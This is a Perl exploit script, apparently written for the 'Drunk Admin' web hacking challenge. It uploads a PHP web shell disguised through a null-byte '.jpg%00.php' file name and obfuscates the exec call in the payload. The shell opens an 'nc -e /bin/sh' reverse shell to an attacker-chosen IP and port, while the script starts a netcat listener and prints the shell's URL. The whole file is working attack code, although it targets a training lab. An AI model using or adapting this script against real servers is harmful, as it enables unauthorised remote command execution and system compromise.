use LWP::UserAgent;
use Digest::MD5 qw( md5_hex );
 
# -----------------------------------------------------------------------------------------
#  HangOver v.1 : Remote exploitation script for "Drunk Admin" Web Hacking Challenge.
# -----------------------------------------------------------------------------------------
#
#  WARNING : Don't drink and code!??
#  mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)
#
# -----------------------------------------------------------------------------------------
#  Many thanks to Anestis Bechtsoudis (@anestisb) for this challenge.
# -----------------------------------------------------------------------------------------
 
print "+-----------------------------------+\n";
print "| HangOver v.1 - Run(2)Shell Script |\n";
print "+-----------------------------------+\n";
 
print "\nEnter the IP address of the target box (e.g.: http://192.168.178.39)";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);
 
print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)";
print "\n> ";
$ip=<STDIN>;
chomp($ip);
 
print "\nEnter the port to connect back on (e.g.: 4444)";
print "\n> ";
$port=<STDIN>;
chomp($port);
 
$payload =
'<?php'."\n".
'$a = "nc";'."\n".
'$b = " -e ";'."\n".
'$c = "/bin/sh '.$ip.' '.$port.'";'."\n".
'$cmd = $a.$b.$c;'."\n".
'$dead = "echo ex";'."\n".
'$beef = "ec(\'".$cmd ."\');";'."\n".
'$send = $dead.$beef;'."\n".
'echo eval($send);'."\n".
'?>';
 
$filename = int(rand()*10110110).".jpg%00.php";
open FILE, ">$filename" or die $!;
print FILE $payload;
close FILE;
 
print "\n[+]Uploading the shell to server...\n";
system('curl -s -b trypios=uploader -F image=@'.$filename.' -F "Submit=Host My Awesome Image" '.$target.':8880/upload.php');
 
$nc= "nc -lvp $port";
system("xterm -e $nc &");
 
$md5 = md5_hex("$filename");
 
print "\n[+]Check for the shell:\n";
print $target.":8880/images/".$md5.".php\n\n";
